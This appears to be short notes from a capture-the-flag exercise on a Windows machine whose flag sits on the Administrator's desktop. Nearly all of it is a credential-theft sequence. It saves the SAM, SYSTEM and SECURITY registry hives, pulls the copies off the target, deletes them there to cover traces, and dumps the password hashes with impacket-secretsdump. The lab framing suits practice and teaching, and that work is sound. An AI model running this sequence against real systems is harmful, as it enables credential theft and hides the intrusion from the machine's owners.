The flag is in the Administrator's desktop



Restore password 
Backup Registry
reg save HKLM\SYSTEM system.save
reg save HKLM\SAM sam.save 
reg save HKLM\SECURITY security.save

Transfer file 
lget system.save 
lget sam.save 
lget security.save

Delete file on target machine
del /f system.save
del /f sam.save
del /f security.save 

impacket-secretsdump -sam sam.save -system system.save -security security.save LOCAL 

